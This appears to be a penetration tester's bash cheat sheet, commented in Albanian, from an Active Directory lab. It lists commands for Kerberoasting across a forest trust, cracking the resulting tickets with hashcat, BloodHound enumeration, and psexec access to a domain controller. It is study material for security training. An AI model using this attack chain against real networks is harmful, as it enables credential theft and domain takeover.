
```bash
# ==============================
# 1️⃣ Kerberoast Across Forest Trust (GetUserSPNs.py)
# ==============================

# Listo SPN për përdoruesit në target domain përveç MSSQLsvc
# Krijojm SPN nga domeini Freight... por ne indentifikohemi nga Inlane...
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/<USER>

# Merr TGS për përdoruesin me SPN
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/<USER>

# Ruaj TGS direkt në file për Hashcat
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/<USER> -outputfile tgs.txt

# Crack TGS offline me Hashcat (mode 13100)
hashcat -m 13100 tgs.txt wordlist.txt

# ==============================
# 2️⃣ Configurimi i DNS në Linux
# ==============================

sudo nano /etc/resolv.conf

# Për INLANEFREIGHT.LOCAL
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

# ==============================
# 3️⃣ Mbledhja e të dhënave me BloodHound-python
# ==============================

# Against INLANEFREIGHT.LOCAL
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u <USER> -p <PASSWORD>

# Against FREIGHTLOGISTICS.LOCAL
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u <USER>@inlanefreight.local -p <PASSWORD>

# Kompreso JSON rezultatet për GUI
zip -r ilfreight_bh.zip *.json

# ==============================
# 4️⃣ Përdorimi i psexec.py për të hyrë në Domain Controller
# ==============================

# Formati i rekomanduar për credential + target-ip
psexec.py DOMAIN/username@TARGET-IP
# ose
psexec.py username@DOMAIN -target-ip TARGET-IP

# Shembull praktik
psexec.py FREIGHTLOGISTICS.LOCAL/Administrator@172.16.5.238

psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238
```